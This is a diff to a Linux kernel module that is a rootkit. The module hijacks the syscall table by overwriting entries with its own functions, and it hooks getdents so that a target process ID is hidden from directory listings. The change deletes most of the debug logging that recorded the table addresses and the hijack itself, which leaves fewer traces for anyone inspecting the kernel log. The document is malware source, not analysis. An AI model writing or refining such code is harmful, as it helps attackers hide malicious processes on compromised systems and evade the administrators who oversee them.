@@ -66,7 +66,6 @@ static int lkm_syscall_getdents(unsigned int fd,
     while (offset < ret) {
         offset_buffer = ((char*)loc_dirp) + offset;
         dir = (struct linux_dirent *)offset_buffer;
-        printk("%s: local_dirp[i] = %s\n", TAG, dir->d_name);
 
         if (strcmp(hidden_pid, dir->d_name) == 0) {
             printk("%s: Match to hidden pid %s found", TAG, hidden_pid);
@@ -116,17 +115,9 @@ static void replace_syscall(ulong offset, ulong func_address, void **old_func)
     syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
 
     if (is_syscall_table(syscall_table)) {
-        printk(KERN_INFO "%s: Syscall table address : %p\n", TAG, syscall_table);
         page_read_write((ulong)syscall_table);
         *old_func = (void *)(syscall_table[offset]);
-        printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
-                *old_func);
-        printk(KERN_INFO "%s: Custom syscall address %p\n", TAG,
-                (void*)func_address);
         syscall_table[offset] = func_address;
-        printk(KERN_INFO "%s: Syscall hijacked\n", TAG);
-        printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
-                (void *)syscall_table[offset]);
         page_read_only((ulong)syscall_table);
     }
 }
@@ -147,8 +138,6 @@ static void cleanup_syscall(void)
     syscall_table[SYSCALL_NI] = (ulong)original_syscall;
     syscall_table[SYSCALL_GD] = (ulong)original_syscall_getdents;
     page_read_only((ulong)syscall_table);
-    printk(KERN_INFO "%s: Syscall at offset %d : %p\n", TAG, SYSCALL_NI,
-            (void *)syscall_table[SYSCALL_NI]);
     printk(KERN_INFO "%s: Custom syscall unloaded\n", TAG);
 }
 
